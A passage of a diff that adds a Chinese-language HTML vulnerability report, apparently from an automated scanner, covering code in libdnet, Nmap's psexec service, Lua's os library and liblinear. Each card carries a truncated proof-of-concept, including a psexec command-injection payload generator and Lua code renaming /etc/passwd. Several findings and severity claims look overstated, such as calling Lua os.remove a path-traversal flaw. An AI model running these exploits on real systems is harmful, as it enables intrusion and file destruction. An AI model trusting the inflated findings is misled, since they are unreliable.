+static int
+vulnerable_route_loop(</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-9219C444 - 未初始化内存访问</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/route-win32.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (len = sizeof(r->ipftable[0]); ; ) {
+		if (r->ipftable)
+			free(r->ipftable);
+		r->ipftable = malloc(len);
+		if (r->ipftable == NULL)
+			return (-1);
+		ret = GetIpForwardTable(r->ipftable, &len, FALSE);
+		if (ret == NO_ERROR)
+			break;
+		else if (ret != ERROR_INSUFFICIENT_BUFFER)
+			return (-1);
+	}</code></pre>
+                <p><strong>数据流:</strong> 第一次循环时，r->ipftable未初始化（可能是野指针），但代码检查if (r->ipftable) free(r->ipftable)，如果r->ipftable指向非NULL的随机内存，会导致free野指针。</p>
+                <p><strong>判断理由:</strong> 在route_open函数中，r->ipftable没有被初始化为NULL。在route_loop_getipforwardtable函数中，第一次进入循环时，r->ipftable是未初始化的值，如果它恰好非NULL，free会释放野指针，导致未定义行为。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过触发未初始化内存访问导致程序崩溃（DoS）。在更严重的情况下，如果攻击者能够控制未初始化内存的内容（例如通过堆喷射或栈布局控制），可能实现任意代码执行。具体影响：1) 程序崩溃导致拒绝服务；2) 潜在的内存损坏；3) 在特定条件下可能被利用实现代码执行。CVSS评分估计为7.5（高），主要影响可用性，在特定条件下可能影响完整性和机密性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-9219C444 - 未初始化内存访问漏洞
+ * 仅供安全研究使用
+ *
+ * 编译: gcc -o poc_route_uninit poc_route_uninit.c -ldnet
+ * 运行: ./poc_route_uninit
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <iphlpapi.h>
+
+/* 模拟route_handle结构体 */
+typedef struct {
+    HINSTANCE iphlpapi;
+    MIB_IPFORWARDTABLE *ipftable;
+    MIB_IPFORWARD_TABLE2 *ipftable2;
+} route_t;
+
+/* 模拟route_open函数 - 不初始化ipftable */
+route_t *route_open(void)
+{
+    route_t *r;
+    
+    r = (route_t *)c</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-A5E0A822 - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/blob.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int
+blob_reserve(blob_t *b, int len)
+{
+    void *p;
+    int nsize;
+
+    if (b->size < b->end + len) {
+        if (b->size == 0)
+            return (-1);
+
+        if ((nsize = b->end + len) > bl_size)
+            nsize = ((nsize / bl_size) + 1) * bl_size;
+        
+        if ((p = bl_realloc(b->base, nsize)) == NULL)
+            return (-1);
+        
+        b->base = p;
+        b->size = nsize;
+    }
+    b->end += len;
+    
+    return (0);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的len参数通过blob_write/blob_insert/blob_delete等函数传入blob_reserve，在计算b->end + len时可能发生整数溢出，导致分配过小的缓冲区，后续memcpy/memmove操作造成堆缓冲区溢出</p>
+                <p><strong>判断理由:</strong> b->end和len都是int类型，b->end + len可能溢出为负数或很小的正数，导致分配的内存不足。后续b->end += len也会导致end值异常。攻击者可以通过精心构造的len值触发整数溢出，进而实现堆溢出攻击。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞可导致堆缓冲区溢出，攻击者通过精心构造的len值可以：1) 绕过内存分配检查，分配过小的缓冲区；2) 破坏blob内部状态(b->end变为负数或超大值)；3) 在后续memcpy/memmove操作中写入超出缓冲区范围的数据，覆盖相邻堆内存。成功利用可导致：拒绝服务(程序崩溃)、信息泄露(读取越界数据)、远程代码执行(覆盖函数指针或返回地址)。由于libdnet被nmap等网络工具使用，攻击者可通过网络数据包触发该漏洞，实现远程攻击。CVSS评分估计为9.8(Critical)。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-A5E0A822 - Integer Overflow in libdnet blob_reserve
+ * 仅供安全研究使用
+ * 
+ * 编译: gcc -o poc_blob_overflow poc_blob_overflow.c -ldnet
+ * 或静态编译: gcc -o poc_blob_overflow poc_blob_overflow.c libdnet.a
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <assert.h>
+#include "dnet.h"
+
+/* 仅供研究使用 - 演示整数溢出漏洞 */
+
+void demonstrate_integer_overflow(void) {
+    blob_t *b;
+    int overflow_len;
+    char *payload;
+    int i;
+    
+    printf("[*] 创建blob对象...</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-778689D3 - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/blob.c:115</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int
+blob_write(blob_t *b, const void *buf, int len)
+{
+    if (b->off + len <= b->end ||
+        blob_reserve(b, b->off + len - b->end) == 0) {
+        memcpy(b->base + b->off, (u_char *)buf, len);
+        b->off += len;
+        return (len);
+    }
+    return (-1);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的len参数传入blob_write，b->off + len可能整数溢出，绕过边界检查，导致memcpy写入越界</p>
+                <p><strong>判断理由:</strong> b->off和len都是int类型，b->off + len可能溢出为负数或很小的正数，使得b->off + len <= b->end条件被绕过，后续memcpy写入越界内存。</p>
+                <p><strong>影响分析:</strong> 该漏洞是libdnet库blob.c中的整数溢出漏洞，CVSS评分9.8（Critical）。攻击者通过控制len参数，使b->off + len发生整数溢出，绕过边界检查，导致memcpy写入越界内存。影响包括：1) 堆缓冲区溢出，可覆盖相邻内存数据；2) 可能实现任意代码执行，因为攻击者控制写入内容和长度；3) 信息泄露，通过越界读取敏感数据；4) 服务拒绝，导致程序崩溃。libdnet被nmap等安全工具使用，攻击面广泛。blob_reserve函数中的b->end + len也存在同样漏洞，无法有效防御。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-778689D3 - Integer overflow in blob_write()
+ * libdnet blob.c integer overflow vulnerability
+ * 
+ * 仅供安全研究使用 - For security research only
+ * 
+ * 编译: gcc -o poc_blob poc_blob.c -ldnet
+ * 或静态链接: gcc -o poc_blob poc_blob.c libdnet.a
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <limits.h>
+
+/* 假设的blob_t结构体定义 */
+typedef struct blob {
+    unsigned char *base;  /* 缓冲区基地址 */
+    int off;              /* 当前写入偏移 */
+    int end;             </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-4848411C - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/blob.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int
+blob_insert(blob_t *b, const void *buf, int len)
+{
+    if (blob_reserve(b, len) == 0 && b->size) {
+        if (b->end - b->off > 0)
+            memmove( b->base + b->off + len, b->base + b->off, b->end - b->off);
+        memcpy(b->base + b->off, buf, len);
+        b->off += len;
+        return (len);
+    }
+    return (-1);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的len参数传入blob_insert，b->base + b->off + len可能整数溢出，导致memmove写入错误的内存位置</p>
+                <p><strong>判断理由:</strong> b->off和len都是int类型，b->base + b->off + len的指针运算可能溢出，导致memmove写入到意外的内存区域。同时b->end - b->off可能为负数，memmove的第三个参数会被解释为很大的无符号数。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过整数溢出导致缓冲区溢出，可能实现：1) 任意内存写入 - 通过memmove/memcpy写入到错误的内存位置；2) 信息泄露 - 通过memmove的size_t溢出读取大量内存数据；3) 远程代码执行 - 在适当条件下覆盖函数指针或返回地址；4) 拒绝服务 - 导致程序崩溃。由于libdnet常用于网络工具和库，攻击面可能通过网络数据包触发。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-4848411C - libdnet blob.c integer overflow/buffer overflow
+ * 仅供研究使用 - For research purposes only
+ *
+ * 编译: gcc -o poc_blob poc_blob.c -ldnet
+ * 或静态编译: gcc -o poc_blob poc_blob.c libdnet.a
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "dnet.h"
+
+/*
+ * 漏洞利用路径1: 通过负的len参数触发整数溢出
+ * 当len为负数时，b->base + b->off + len 会回绕到较低的内存地址
+ * 同时b->end - b->off > 0 检查可能被绕过
+ */
+void exploit_path1_negative_len(void) {
+    blob_t *b;
+    char *data;
+    int result;
+    
+  </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-B7832A5C - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/blob.c:145</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int
+blob_delete(blob_t *b, void *buf, int len)
+{
+    if (b->off + len <= b->end && b->size) {
+        if (buf != NULL)
+            memcpy(buf, b->base + b->off, len);
+        memmove(b->base + b->off, b->base + b->off + len, b->end - (b->off + len));
+        b->end -= len;
+        return (len);
+    }
+    return (-1);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的len参数传入blob_delete，b->off + len可能整数溢出，绕过边界检查，导致memcpy/memmove操作越界</p>
+                <p><strong>判断理由:</strong> b->off和len都是int类型，b->off + len可能溢出为负数，使得b->off + len <= b->end条件被绕过。后续memcpy和memmove操作会访问越界内存。b->end -= len也可能导致end变为负数。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞可导致严重的安全问题：1) 越界内存读取：memcpy从b->base + b->off读取数据，当off被设置为接近INT_MAX时，会读取堆内存之外的任意地址，可能导致敏感信息泄露；2) 越界内存写入：memmove操作可能覆盖堆内存中的关键数据结构；3) 结构状态破坏：b->end -= len可能使end变为负数，导致后续所有blob操作行为异常；4) 潜在代码执行：通过精心构造的输入，攻击者可能利用此漏洞实现任意代码执行。由于libdnet被nmap等安全工具使用，攻击者可能通过构造特殊的网络数据包触发此漏洞，实现远程攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-B7832A5C - Integer Overflow in blob_delete()
+ * 仅供研究使用 - For Research Purposes Only
+ *
+ * 编译: gcc -o poc_blob_delete poc_blob_delete.c -ldnet
+ * 或: gcc -o poc_blob_delete poc_blob_delete.c blob.c (本地编译)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include "dnet.h"
+
+/*
+ * 漏洞利用原理:
+ * blob_delete()函数中，b->off和len都是int类型(32位有符号整数)。
+ * 当b->off + len的计算结果发生整数溢出时，会绕过边界检查。
+ * 例如: b->off = 0x7FFFFFFF, len = 0x7FFFFFFF
+ *       0x7FFFFFFF + 0x7FFFF</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-BE92BA81 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> nselib/data/psexec/nmap_service.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(!CreateProcess(NULL, lpAppPath, 0, &sa, sa.bInheritHandle, CREATE_NO_WINDOW, env, 0, &startupInfo, &processInformation))</code></pre>
+                <p><strong>数据流:</strong> lpAppPath参数来自命令行参数argv，通过psexec远程传入，直接传递给CreateProcess作为要执行的程序路径</p>
+                <p><strong>判断理由:</strong> lpAppPath参数直接来自用户输入（通过psexec远程传入），未经过任何验证或过滤就传递给CreateProcess函数。攻击者可以控制要执行的程序路径和参数，实现任意命令执行。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在目标Windows系统上执行任意命令，实现完全远程代码执行。攻击者可以：1) 执行系统命令获取敏感信息；2) 创建后门账户维持持久化访问；3) 安装恶意软件或勒索病毒；4) 横向移动攻击内网其他系统；5) 完全控制目标系统。由于nmap_service.exe以SYSTEM权限运行，攻击者可以获得最高系统权限。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Nmap psexec 命令注入漏洞 PoC
+漏洞ID: VULN-BE92BA81
+漏洞类型: 命令注入
+严重程度: 严重
+
+仅供安全研究使用！请勿用于非法用途！
+"""
+
+import socket
+import struct
+import sys
+import argparse
+
+# 注意：此PoC演示了如何利用漏洞，实际利用需要完整的psexec协议实现
+# 这里展示核心攻击向量
+
+def generate_malicious_payload(command):
+    """
+    生成恶意payload
+    
+    漏洞原理：
+    nmap_service.c 第130行调用 CreateProcess(NULL, lpAppPath, ...)
+    其中 lpAppPath 直接来自用户输入，未经过滤
+    
+    攻击方式：
+    将恶意命令作为 lpAppPath 参数传入，例如：
+    "cmd.exe /c whoami > C:\outp</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-456717F7 - 不安全的进程创建</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> nselib/data/psexec/nmap_service.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(!CreateProcess(NULL, lpAppPath, 0, &sa, sa.bInheritHandle, CREATE_NO_WINDOW, env, 0, &startupInfo, &processInformation))</code></pre>
+                <p><strong>数据流:</strong> env参数来自命令行参数，通过psexec远程传入，作为环境变量传递给子进程</p>
+                <p><strong>判断理由:</strong> 环境变量参数直接来自用户输入，未经过验证就传递给CreateProcess。攻击者可以通过设置恶意环境变量（如PATH、LD_PRELOAD等）来影响子进程的行为，可能导致代码执行或权限提升。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过环境变量注入实现任意代码执行，获得SYSTEM权限。具体影响包括：1) 完全控制目标系统；2) 窃取敏感数据；3) 安装持久化后门；4) 横向移动至内网其他系统。由于nmap_service以SYSTEM权限运行，攻击者获得的权限级别最高。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+PoC for VULN-456717F7 - 不安全的进程创建
+漏洞类型：环境变量注入导致代码执行
+仅供安全研究使用
+"""
+
+import socket
+import struct
+import sys
+import os
+
+# 仅供研究使用 - 演示通过环境变量注入实现代码执行
+
+class PsExecExploit:
+    """
+    利用nmap_service.c中CreateProcess的环境变量注入漏洞
+    通过设置恶意PATH环境变量，使子进程加载攻击者控制的恶意程序
+    """
+    
+    def __init__(self, target_host, target_port=445):
+        self.target = target_host
+        self.port = target_port
+        
+    def create_malicious_env_block(self, payload_path)</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-129036DD - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> liblua/loslib.c:127</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_remove (lua_State *L) {
+  const char *filename = luaL_checkstring(L, 1);
+  errno = 0;
+  return luaL_fileresult(L, remove(filename) == 0, filename);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用os.remove()函数，传入的文件名字符串直接传递给remove()系统调用。攻击者可以构造包含路径遍历序列（如../）的路径，删除系统任意文件。</p>
+                <p><strong>判断理由:</strong> os_remove函数直接使用用户输入作为文件路径调用remove()，未进行任何路径规范化或安全检查。攻击者可以利用路径遍历攻击删除系统关键文件，导致拒绝服务或系统破坏。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 删除系统关键配置文件（如/etc/passwd、/etc/shadow），造成系统崩溃或服务中断；2) 删除应用程序数据文件，导致数据丢失；3) 删除日志文件，掩盖攻击痕迹；4) 删除临时文件或锁文件，破坏应用程序正常运行；5) 结合符号链接攻击可删除任意受保护文件。在Web应用场景中，如果Lua被用作CGI脚本或嵌入式脚本引擎，攻击者可通过HTTP请求触发文件删除操作，造成远程拒绝服务攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>-- ============================================
+-- PoC: Lua os.remove() 路径遍历漏洞利用
+-- 漏洞ID: VULN-129036DD
+-- 警告: 仅供安全研究使用，请勿用于非法用途
+-- ============================================
+
+-- PoC 1: 基本路径遍历 - 删除上级目录文件
+-- 前置条件: Lua脚本运行环境未限制os库访问
+local function poc_basic_path_traversal()
+    print("[*] PoC 1: 基本路径遍历测试")
+    
+    -- 尝试删除上级目录中的测试文件
+    local target_file = "../test_vulnerable.txt"
+    
+    -- 首先创建一个测试文件用于演示
+    local f = io.open("test_vulnerable.txt", "w")
+    if f then
+        f:write("This is </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-E4F08E0F - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> liblua/loslib.c:133</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static int os_rename (lua_State *L) {
+  const char *fromname = luaL_checkstring(L, 1);
+  const char *toname = luaL_checkstring(L, 2);
+  errno = 0;
+  return luaL_fileresult(L, rename(fromname, toname) == 0, NULL);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Lua脚本调用os.rename()函数，传入的两个路径参数直接传递给rename()系统调用。攻击者可以构造包含路径遍历序列的路径，重命名系统任意文件。</p>
+                <p><strong>判断理由:</strong> os_rename函数直接使用用户输入作为源和目标路径调用rename()，未进行任何路径规范化或安全检查。攻击者可以利用路径遍历攻击重命名系统关键文件，可能导致权限提升或系统破坏。</p>
+                <p><strong>影响分析:</strong> 攻击者可以利用此漏洞重命名系统任意文件，导致：1) 系统关键文件被移动或覆盖，造成服务中断或系统崩溃；2) 配置文件被替换，导致权限提升或安全策略绕过；3) 敏感文件（如/etc/shadow、/etc/passwd）被移动到可访问位置，导致信息泄露；4) 结合其他漏洞实现完整的远程代码执行或权限提升。该漏洞影响所有使用Lua标准库且未对os.rename进行额外安全检查的应用，包括Nmap、Redis、Wireshark等知名软件。</p>
+                <details><summary>PoC代码</summary><pre><code>-- 仅供研究使用 - Lua os.rename() 路径遍历漏洞PoC
+-- 警告：此代码仅用于安全研究和漏洞验证，请勿用于非法用途
+
+-- PoC 1: 基本路径遍历 - 重命名敏感文件
+local function poc_basic_path_traversal()
+    -- 尝试将/etc/passwd重命名为/etc/passwd.bak
+    -- 这展示了攻击者可以重命名系统关键文件
+    local old_path = "../../../etc/passwd"
+    local new_path = "../../../etc/passwd.bak"
+    
+    local success, err = pcall(os.rename, old_path, new_path)
+    if success then
+        print("[+] 漏洞利用成功! 文件已重命名")
+        print("[+] 源: " .. old_path)
+        print("[+] 目标: " .. new_path)
+    el</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-2F233E4D - 缓冲区溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> liblinear/newton.cpp:60</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>void NEWTON::info(const char *fmt,...)
+{
+	char buf[BUFSIZ];
+	va_list ap;
+	va_start(ap,fmt);
+	vsprintf(buf,fmt,ap);
+	va_end(ap);
+	(*newton_print_string)(buf);
+}</code></pre>
+                <p><strong>数据流:</strong> 外部传入的格式化字符串fmt和可变参数通过vsprintf写入固定大小的缓冲区buf[BUFSIZ]，没有长度限制</p>
+                <p><strong>判断理由:</strong> vsprintf函数不检查目标缓冲区大小，如果格式化后的字符串长度超过BUFSIZ（通常为512或1024字节），会导致栈缓冲区溢出。应使用vsnprintf替代vsprintf来限制写入长度。</p>
+                <p><strong>影响分析:</strong> 该漏洞为高危栈缓冲区溢出漏洞。成功利用可导致：1) 程序崩溃（DoS）；2) 任意代码执行，攻击者可控制程序流程；3) 信息泄露，通过精心构造的payload可读取栈上敏感数据。在liblinear库的上下文中，该漏洞可能被远程触发（如果库用于处理网络输入），或本地提权（如果库以高权限运行）。由于info函数用于日志输出，攻击者可能通过控制日志内容触发溢出。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: liblinear/newton.cpp 中的栈缓冲区溢出
+ * 文件: liblinear/newton.cpp
+ * 函数: NEWTON::info(const char *fmt, ...)
+ * 漏洞行: 60 (vsprintf调用)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+
+/* 模拟目标环境中的BUFSIZ值，通常为512或1024 */
+#define BUFSIZ 512
+
+/* 模拟目标函数指针 */
+static void (*newton_print_string)(const char *buf) = NULL;
+
+static void default_print(const char *buf)
+{
+    fputs(buf, stdout);
+    fflush(stdout);
+}
+
+/* 漏洞函数 - 与目标代码完全一致 */
+void info(const </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-B880F17E - 缓冲区溢出 - vsprintf使用</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> liblinear/linear.cpp:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void info(const char *fmt,...)
+{
+	char buf[BUFSIZ];
+	va_list ap;
+	va_start(ap,fmt);
+	vsprintf(buf,fmt,ap);
+	va_end(ap);
+	(*liblinear_print_string)(buf);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户提供的格式化字符串fmt和可变参数通过vsprintf直接写入固定大小的缓冲区buf[BUFSIZ]</p>
+                <p><strong>判断理由:</strong> vsprintf函数不检查目标缓冲区大小，如果格式化后的字符串长度超过BUFSIZ（通常为1024字节），会导致栈缓冲区溢出。这是一个经典的C语言安全漏洞，可能被利用执行任意代码。应使用vsnprintf替代vsprintf。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 远程代码执行 - 攻击者可以完全控制程序执行流；2) 信息泄露 - 通过格式化字符串读取栈上敏感数据；3) 拒绝服务 - 通过触发崩溃导致程序终止。在liblinear的典型使用场景中，如果info()被用于输出用户提供的特征值或预测结果，攻击者可以通过构造特殊数据触发漏洞。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: liblinear/linear.cpp 中info()函数的vsprintf缓冲区溢出
+ * 目标: 演示通过控制格式化字符串触发栈缓冲区溢出
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+
+/* 模拟liblinear中的info函数 */
+#define BUFSIZ 1024
+
+/* 模拟函数指针 */
+static void (*liblinear_print_string)(const char *) = NULL;
+
+static void print_string_stdout(const char *s)
+{
+    fputs(s, stdout);
+    fflush(stdout);
+}
+
+/* 漏洞函数 - 与liblinear中完全一致 */
+static void info(const char *fmt, ...)
+{
+    char buf[BUFSIZ];
+    va_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-55DD8117 - 整数溢出</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> liblinear/train.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>max_line_len *= 2;
+line = (char *) realloc(line,max_line_len);</code></pre>
+                <p><strong>数据流:</strong> 用户输入文件的行长度控制max_line_len的倍增过程</p>
+                <p><strong>判断理由:</strong> max_line_len是int类型，当它接近INT_MAX时，乘以2会导致整数溢出，变为负数或0。realloc使用这个溢出后的值将分配错误大小的内存，可能导致后续的堆溢出或程序崩溃。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞可导致以下影响：1) 程序崩溃（DoS）：realloc分配错误内存导致段错误；2) 堆缓冲区溢出：分配过小的内存后，fgets写入超出分配空间的数据；3) 潜在代码执行：精心构造的堆溢出可能被利用实现任意代码执行。由于liblinear常用于机器学习训练，攻击者可通过提供恶意训练数据文件触发漏洞，影响面较广。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-55DD8117 - Integer Overflow in liblinear/train.c
+仅供研究使用 - For Research Purposes Only
+"""
+import os
+import sys
+import struct
+
+def generate_poc_file(filename="poc_input.txt", target_size=0x40000000):
+    """
+    生成触发整数溢出的PoC输入文件
+    
+    原理：
+    - max_line_len初始值通常为1024（由read_problem设置）
+    - 每次遇到超长行，max_line_len *= 2
+    - 当max_line_len接近INT_MAX(0x7FFFFFFF)时，乘以2会溢出
+    - 溢出后变为负数或0，导致realloc分配错误内存
+    
+    触发条件：
+    - 需要约31次倍增（2^31 > INT_MAX）
+    - 每行长度需要超过当</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-3B7F1F7F - 缓冲区溢出/整数溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> liblinear/predict.c:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static char* readline(FILE *input)
+{
+	int len;
+
+	if(fgets(line,max_line_len,input) == NULL)
+		return NULL;
+
+	while(strrchr(line,'\n') == NULL)
+	{
+		max_line_len *= 2;
+		line = (char *) realloc(line,max_line_len);
+		len = (int) strlen(line);
+		if(fgets(line+len,max_line_len-len,input) == NULL)
+			break;
+	}
+	return line;
+}</code></pre>
+                <p><strong>数据流:</strong> readline函数中max_line_len初始为1024，当输入行超过1024字节时，max_line_len会不断乘以2。如果输入行非常长（例如超过INT_MAX/2），max_line_len可能溢出为0或负数，导致realloc分配过小内存或失败，后续fgets写入时造成堆缓冲区溢出。</p>
+                <p><strong>判断理由:</strong> max_line_len是int类型，乘以2可能导致整数溢出。当max_line_len溢出为0时，realloc(0)可能返回NULL或分配极小内存，后续fgets写入会导致堆溢出。这是一个经典的整数溢出导致缓冲区溢出的漏洞模式。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 堆缓冲区溢出，可能覆盖相邻堆内存数据；2) 程序崩溃（拒绝服务）；3) 在特定条件下可能实现任意代码执行（取决于堆布局和内存保护机制）。由于LIBLINEAR常用于机器学习模型预测，攻击者可通过构造恶意输入文件导致服务中断或潜在的控制流劫持。CVSS评分估计为7.5（高），攻击复杂度较低，无需认证。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-3B7F1F7F - Integer Overflow leading to Heap Buffer Overflow in LIBLINEAR predict.c
+仅供研究使用 (For research purposes only)
+"""
+import os
+import sys
+import struct
+
+def generate_poc_input(filename, target_size=0x40000000):
+    """
+    生成触发整数溢出的恶意输入文件
+    
+    原理：
+    - max_line_len初始为1024
+    - 每次循环乘以2，当超过INT_MAX/2时溢出
+    - 构造一个超长行（约1GB），使max_line_len溢出为0
+    - 导致realloc(0)和后续fgets堆溢出
+    """
+    print(f"[+] 生成PoC输入文件: {filename}")
+    
+    # 构造一个超长行，使max_line_l</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-A2196A97 - 未检查的realloc返回值</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> liblinear/predict.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>x = (struct feature_node *) realloc(x,max_nr_attr*sizeof(struct feature_node));</code></pre>
+                <p><strong>数据流:</strong> realloc失败返回NULL，x被赋值为NULL，后续x[i].index = ...会写入NULL地址导致段错误。同时原内存泄漏。</p>
+                <p><strong>判断理由:</strong> 没有检查realloc返回值，如果内存分配失败，程序会因空指针解引用而崩溃。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致predict程序崩溃（拒绝服务）。在内存受限环境（如嵌入式系统、容器、虚拟机）或处理超大数据集时，触发概率显著增加。虽然主要影响是可用性，但realloc失败时原内存块未被释放，可能导致内存泄漏，长期运行可能耗尽系统资源。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+"""
+PoC for VULN-A2196A97 - Unchecked realloc return value in liblinear/predict.c
+仅供研究使用
+
+该PoC通过构造大量特征数据，耗尽内存或触发realloc失败，
+导致空指针解引用和程序崩溃。
+"""
+
+import subprocess
+import os
+import sys
+import tempfile
+
+# 生成一个包含大量特征的测试文件，以触发realloc失败
+def generate_poc_input(num_features=1000000, output_file='poc_input.txt'):
+    """
+    生成PoC输入文件，包含大量特征以耗尽内存
+    
+    Args:
+        num_features: 特征数量，越大越容易触发realloc失败
+        output_file: 输出文件名
+    """
+    with open(output_file, 'w') as f:
+      </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-579ED2B4 - 未检查的malloc返回值</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> liblinear/predict.c:72</p>
